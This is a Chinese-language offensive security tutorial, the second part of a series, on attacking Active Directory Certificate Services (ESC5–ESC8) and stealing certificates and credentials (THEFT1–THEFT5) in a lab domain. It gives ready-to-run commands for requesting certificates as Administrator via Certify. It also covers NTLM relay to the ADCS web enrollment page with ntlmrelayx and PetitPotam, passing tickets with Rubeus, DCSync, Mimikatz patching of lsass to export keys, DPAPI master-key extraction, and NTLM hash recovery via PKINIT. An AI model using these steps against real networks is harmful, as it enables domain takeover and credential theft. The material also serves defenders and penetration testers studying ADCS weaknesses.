前言：

上一篇文章[《ADCS知识点全收录！如何利用证书服务器对域控进行多角度攻击（上）》](articles/network/364520.html)主要介绍了ADCS的基础概念、基本原理以及证书模板错误配置攻击ESC1-4的攻击手法。本文主要分享ESC5-8及证书窃取相关内容。

##  **E** **SC5-** **PKI ACL 安全威胁**

当涉及到ADCS的安全性时，访问控制列表（ACL）之间的相互关系是一个复杂而广泛的网络，这个网络的影响范围很大。证书模板和证书颁发机构本身之外的几个对象可能会对整个ADCS系统产生安全影响。这些可能性包括但不限于：

  * CA服务器的AD计算机对象（例如，通过S4U2Self或S4U2Proxy进行的攻击）
  * CA服务器的RPC/DCOM服务
  * 在CN=Public Key Services,CN=Services,CN=Configuration,DC=<computer>,DC=<com> 容器中，任何子对象容器都会影响ADCS的安全性（例如证书模板容器、CA容器、NTAuthCertificates 对象、注册服务容器等）

如果一个低权限的攻击者获取到其中任意一个的控制权，则可能会影响到整个PKI系统的安全性。

##  **ESC6** **-启用EDITF_ATTRIBUTESUBJECTALTNAME2标志**

在企业内部，为了保证网络通信的安全性，使用内部PKI为Web服务器颁发证书是一种常见的做法。管理员通常希望在这些证书中添加额外的主机名，这可以通过允许提供
SAN 请求属性（在 CA 上设置 +EDITF_ATTRIBUTESUBJECTALTNAME2 标志）来实现。

根据微软的描述"If this flag is set on the CA, any request (including when the subject
is built from Active Directory) can have user defined values in the subject
alternative name" ，如果设置了此标志位攻击者可以为任意的域用户注册证书。

![图片](https://image.3001.net/images/20230423/1682228574_6444c55ea158189cd1fd8.png!small)

使用命令设置：

certutil -config "ADCS.lohack.com\lohack-ADCS-CA" -setreg "policy\EditFlags"
+EDITF_ATTRIBUTESUBJECTALTNAME2

使用命令查看：

certutil -config "ADCS.lohack.com\lohack-ADCS-CA" -getreg "policy\EditFlags"

![图片](https://image.3001.net/images/20230423/1682228589_6444c56de1d523dbe88d3.png!small)

使用certify来查看发现已经设置了EDITF_ATTRIBUTESUBJECTALTNAME2使用者可选名称可以被设置

![图片](https://image.3001.net/images/20230423/1682228604_6444c57c4148900e67170.png!small)

申请一张证书：

Certify.exe request /ca:ADCS.lohack.com\LOHACK-ADCS-CA /template:User
/altname:LOHACK\Administrator

![图片](https://image.3001.net/images/20230423/1682228622_6444c58eec4b9ad09b232.png!small)

可以发现使用者可选名称为administrator

![图片](https://image.3001.net/images/20230423/1682228634_6444c59a73ff0ce3d934b.png!small)

接着就可以同前面模版申请TGT票据了，删除标志可以使用命令：

certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags
-EDITF_ATTRIBUTESUBJECTALTNAME2

##  **ESC7-** **CA ACL 安全威胁**

除证书模板外，CA自身也有一组权限，用于保护各种CA动作。运行框输入certsrv.msc打开CA，右击属性，打开安全。设置一个账户拥有颁发和管理证书与管理CA的权限账户。

![图片](https://image.3001.net/images/20230423/1682228714_6444c5eabb9fcf335a63c.png!small)

  

然后用PSPKI模块的Get-CertificationAuthority | Get-CertificationAuthorityAcl
进行枚举CA的ACL。可以看到test1 具有颁发和管理CA权限。

命令：

Get-CertificationAuthority -ComputerName ADCS.LOHACK.COM | Get-CertificationAuthorityAcl | select -expand Access

![图片](https://image.3001.net/images/20230423/1682228726_6444c5f69719e4159b9ec.png!small)

若为任意用户开启了管理CA权限，PSPKI工具可以直接使用DCOM接口，其中包括ICertAdminD2::SetConfigEntry接口，而ICertAdminD2::SetConfigEntry可以设置Config_CA_Accept_Request_Attributes_SAN的值，也就是我们在ESC6中提到的EDITF_ATTRIBUTESUBJECTALTNAME2的值，那么我们就可以为任意账户申请证书了。

 **首先查看原来的证书策略**

![图片](https://image.3001.net/images/20230423/1682228738_6444c602448ee33fab15c.png!small)

 **然后使用PSPKI修改Config_CA_Accept_Request_Attributes_SAN的值**

![图片](https://image.3001.net/images/20230423/1682228748_6444c60cdd66c50b1b34b.png!small)

 **最后发现已经可以有EDITF_ATTRIBUTESUBJECTALTNAME2的值了**

![图片](https://image.3001.net/images/20230423/1682228758_6444c61616846dd2c6347.png!small)

 **此时我们可以利用上面的ESC6 进行证书的申请**

另外若为任意用户开启了颁发和管理证书权限，则方法ICertAdminD::ResubmitRequest将会重新提交被CA待处理或者拒绝的证书申请，例如下面，我们设置了一个证书模板，可以和ESC1同样的模板，但是此时要求CA证书管理员批准才可以获得申请的证书。

![图片](https://image.3001.net/images/20230423/1682228774_6444c6262b438d3580038.png!small)

我们可以看一下现在的ESC7 证书模板，设置了msPKI-Certificate-Name-Flag为ENROLLEE_SUPPLIES_SUBJECT，并且还设置了PEND_ALL_REQUESTS。

![图片](https://image.3001.net/images/20230423/1682228785_6444c631cf059995f0621.png!small)

利用此模板申请证书，可以发现证书在待办，申请的证书被挂起。

![图片](https://image.3001.net/images/20230423/1682228796_6444c63c02f69618d6b3d.png!small)

此时如果我们有了颁发和管理证书权限，那么我们就可以利用PSPKI来批准请求，其中id:8为我们申请的证书ID。

![图片](https://image.3001.net/images/20230423/1682228807_6444c6471e64541eb1cd3.png!small)

最后再次通过certify申请证书，可以看到最后申请成功。

![图片](https://image.3001.net/images/20230423/1682228818_6444c6524335fc21c1ff5.png!small)

可以申请到证书，其使用者可选名称为Administrator。

![图片](https://image.3001.net/images/20230423/1682228829_6444c65d5f522a4cf4122.png!small)

##  **ESC8-NTLM中继到ADCS**

在上篇文章中我们可以通过web的方式来注册证书，但是在默认的情况下，web证书注册页面仅支持HTTP协议，支持NTLM身份验证，并且没有启用任何NTLM
Relay保护措施。

如果我们强制域控制器的机器账户向攻击者的服务器发起NTLM身份验证，再将域控制器NTLM验证请求Relay到ADCS
Web界面，就可以为域控制器申请一个AD 证书，我们使用这个证书即可以域控制器的名义进行域身份验证，并获得域控制器所拥有的特权。

下面是我们的测试环境：

  * 域控IP:10.10.21.2（DC01）
  * 证书服务器IP：10.10.21.3（ADCS）
  * Win10：10.10.21.4（win10）

首先使用impacket攻击包中的ntlmrelayx进行监听，命令：

ntlmrelayx.py -t http://10.10.21.3/certsrv/certfnsh.asp --adcs -smb2support
-ts -debug --template DomainController

# --adcs 启用 AD CS Relay 攻击

# --template指定 AD CS 证书模板

![图片](https://image.3001.net/images/20230423/1682228891_6444c69b4fe74420da077.png!small)

使用petitpotam使域控对10.10.21.4 进行强制认证，命令：

petitpotam.py 10.10.21.4 10.10.21.2 -d lohack.com

![图片](https://image.3001.net/images/20230423/1682228903_6444c6a7d61b0c3fffa78.png!small)

此时，ntlmrelayx.py 将截获域控机器账户DC01$的 Net-NTLM
Hash，并将其中继到ADCS服务器的Web接口进行身份验证，之后将为DC01$ 账户生成Base64格式的证书，如下图所示。

![图片](https://image.3001.net/images/20230423/1682228915_6444c6b3cdfd2743aa728.png!small)

将得到的证书复制下来，通过 Rubeus 请求 TGT 票据。在域内普通用户的机器上执行以下命令，申请域控机器账户的 TGT
票据，并将票据传递到内存中，如下所示。

Rubeus.exe asktgt /user:DC01$ /certificate:/ptt

![图片](https://image.3001.net/images/20230423/1682228931_6444c6c3e1d25af8cf98d.png!small)

此时执行 klist 命令，当前主机内存中已经保存了DC01$ 账户的TGT票据，如下图所示。

![图片](https://image.3001.net/images/20230423/1682228944_6444c6d05579ebf1f7d09.png!small)

持有域控机器帐户的票据可以执行一些特权操作，例如通过 DCSync 转储域用户哈希，如下所示。

![图片](https://image.3001.net/images/20230423/1682228955_6444c6db13fd0ba20c409.png!small)

最后利用票据列出域控目录

![图片](https://image.3001.net/images/20230423/1682228967_6444c6e71cac98be504b9.png!small)

##  **THEFT1-** **使用加密** **API** **导出证书**

提取用户证书或者机器证书的最简单方式是通过交互桌面提取，此处以用户证书为例，运行框输入certmgr.msc,如果提取机器证书则使用certlm.msc。

![图片](https://image.3001.net/images/20230423/1682228991_6444c6ff25d8bbd740dcb.png!small)![图片](https://image.3001.net/images/20230423/1682229002_6444c70a821d5b07ba717.png!small)

也可通过编程的方式导出，例如使用PowerShell 的ExportPfxCertificate cmdlet 或 TheWover 的
CertStealer82 C# 项目。在底层，这些方法使用 Microsoft CryptoAPI (CAPI) 或更现代的加密 API：下一代
(CNG) 与证书存储进行交互。这些 API 执行证书存储和身份验证（以及其他用途）所需的各种加密服务。

如果私钥是不可导出的，CAPI和CNG将不允许提取不可导出的证书。但是 Mimikatz 的 crypto::capi 和 crypto::cng
命令可以Patch CAPI和CNG以允许导出私钥。crypto::capi在当前进程中Patch CAPI，而crypto::cng可以Patch
lsass.exe的内存，相关命令如下。如下图所示，导出的证书将以 .der 和 .pfx 格式保存到磁盘上。

![图片](https://image.3001.net/images/20230423/1682229014_6444c716bf01f9281a9a8.png!small)

##  **THEFT2-通过DPAPI窃取用户证书**

Windows
使用DPAPI存储证书私钥，微软（Microsoft）将用户和机器私钥的存储位置分开列出，在手动解密DPAPI数据块时，开发人员需要知道操作系统使用的加密API，因为私钥文件的结构在两个API之间有所不同。当使用SharpDPAPI时，会自动处理这些文件格式的差异。

windows
将用户证书存储在注册表的HKEY_CURRENT_USER\SOFTWARE\Microsoft\SystemCertificates键中，尽管如此，一些用户的个人证书也存储在%APPDATA%\Microsoft\SystemCertificates\My\Certificates\路径中。

与用户相关的私钥主要存储在以下位置：对于CAPI密钥，主要位于%APPDATA%\Microsoft\Crypto\RSA\User
SID\，而对于CNG密钥则存储在%APPDATA%\Microsoft\Crypto\Keys\。这些结构有一定的半文档化说明，但 Benjamin
Delpy 在 Mimikatz 中很好地解释了这些结构。通过这些结构，可以推导出：

  * 需要DPAPI主密钥才能解密受保护的私钥Blob，该主密钥定义了解密私钥所需的用户/计算机主密钥（由 GUID 标识）。
  * 私钥的UniqueName(也称为密钥容器名称)是私钥的唯一标识符，windows将证书以某种原始格式存储，并在实际证书数据之前添加了元数据，这些元数据中嵌入了UniqueName或私钥文件名，并且很可能是将私钥与其关联的证书关联起来的最佳做法。由于我们没有开发出这种方法，因此另一种“hackish”的方法是比较解密后的私钥组件与公钥组件。

要获得证书及其关联的私钥，需要：

①确定要从用户的证书库中窃取哪个证书并提取密钥库名称。

②找到解密关联私钥所需的 DPAPI 主密钥。

③获取明文DPAPI masterkey，用它来解密私钥。

有多种方法可以获取明文DPAPI主密钥。域的DPAPI备份密钥可以解密任何域用户的主密钥文件。Mimikatz 的 dpapi::masterkey
/in:”C:\PATH\TO\KEY” /rpc 命令可以检索账户的主密钥。如果知道用户的密码，就可以解密masterkey，使用
SharpDPAPI的masterkeys命令或Mimikatz的dpapi::masterkey /in:”C:\PATH\TO\KEY”
/sid:accountSid /password:PASS 命令。

为了简化主密钥文件和私钥文件的解密，SharpDPAPI 的证书命令可以与 /pvk、/mkfile、/password 或 {GUID}:KEY
参数一起使用来解密私钥和相关证书，输出一个 .pem 文本文件：

现在我们可以首先使用mimikatz检索账户的主密钥，使用命令：

dpapi::masterkey /in:"C:\Users\test1\AppData\Roaming\Microsoft\Protect\账户SID"
/rpc

![图片](https://image.3001.net/images/20230423/1682229072_6444c75046a29b30d6b25.png!small)

执行命令后会获得key和sha1

![图片](https://image.3001.net/images/20230423/1682229082_6444c75ab5dee2e4ac39a.png!small)

接着我们使用过SharpDPAPI获取证书密钥，使用命令：

SharpDPAPI certificates {GUID}:sha1

![图片](https://image.3001.net/images/20230423/1682229094_6444c7664d0f4d902f6e6.png!small)

##  **THEFT3-通过DPAPI窃取机器证书**

Windows
将机器证书存储在注册表的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates并且根据账户在几个不同的地方存储私钥文件，尽管SharpDPAPI会搜索这几个地方，但是大多数来自于%ALLUSERSPROFILE%\Application
Data\Microsoft\Crypto\RSA\MachineKeys(CAPI) 或者%ALLUSERSPROFILE%\Application
Data\Microsoft\Crypto\Keys(CNG)。这些私钥与机器证书存储相关联，Windows使用机器的DPAPI主密钥对它们进行加密。

无法使用域的DPAPI备份密钥解密这些密钥，而必须使用系统上的DPAPI_SYSTEM
LSA机密，该机密仅可由SYSTEM用户访问。您可以使用Mimikatz的lsadump::secrets命令手动执行此操作，然后使用提取的密钥解密机器主密钥。同样你也可以使用Mimikatz
patch CAPI/CNG，命令为crypto::certificates /export /systemstore:LOCAL_MACHINE。

使用SharpDPAPI的certificates命令，并使用/machine标志（在提升权限后），将自动提升到SYSTEM，转储DPAPI_SYSTEM
LSA机密，使用它来解密并查找机器DPAPI主密钥，并使用密钥明文作为查找表来解密任何机器证书私钥：

![图片](https://image.3001.net/images/20230423/1682229140_6444c79449231cab118db.png!small)![图片](https://image.3001.net/images/20230423/1682229151_6444c79fab6d4ab9e1303.png!small)

一旦转换为.pfx文件，如果适当的EKU方案存在，就可以将.pfx用于域身份验证，作为计算机账户。

##  **THEFT4-查找证书文件**

有时候证书和他们的私钥就放在文件夹中，不需要从系统中提取他们，例如，我们已经可以在文件共享，管理员的下载文件夹，源代码存储库和服务器的文件系统（以及许多其他地方）中看到导出的证书及其私钥。

命令：

dir /s /b C:\\*.pfx C:\\*.pem C:\\*.p12

![图片](https://image.3001.net/images/20230423/1682229184_6444c7c031bd6292cece0.png!small)

9 **THEFT5-通过PKINIT窃取NTLM凭据**

这里提到了证书/PKINIT滥用所带来的另一个攻击优势——NTLM凭证窃取，在微软的Kerberos PKINIT技术规范MS-PKCA中有描述：

“In order to support NTLM authentication [MS-NLMP] for applications connecting
to network services that do not support Kerberos authentication, when PKCA is
used, the KDC returns the user’s NTLM one-way function (OWF) in the privilege
attribute certificate (PAC) PAC_CREDENTIAL_INFO buffer”

意思是如果账户通过PKINIT进行身份验证并获取了TGT，则有一个内置的“故障转移”机制，允许当前主机从TGT中获取我们的NTLM哈希以支持传统的身份验证。

也就是说，当使用证书进行 Kerberos PKINIT 身份验证的时候，返回的票据的 PAC 包里面包含用户的 NTLM 凭据。获取这个 NTLM
凭据涉及解密 PAC_CREDENTIAL_DATA 结构，Benjamin Delpy 早在 2016 年就已经在 Kekeo 和 Mimikatz
中实现了这一点，相关命令如下。

tgt::pac /cname:ADCS-LOHACK-CA /subject:test1 /castore:current_user
/domain:lohack.com

![图片](https://image.3001.net/images/20230423/1682229205_6444c7d596be342c9657f.png!small)![图片](https://image.3001.net/images/20230423/1682229215_6444c7dfb31e2aca36131.png!small)

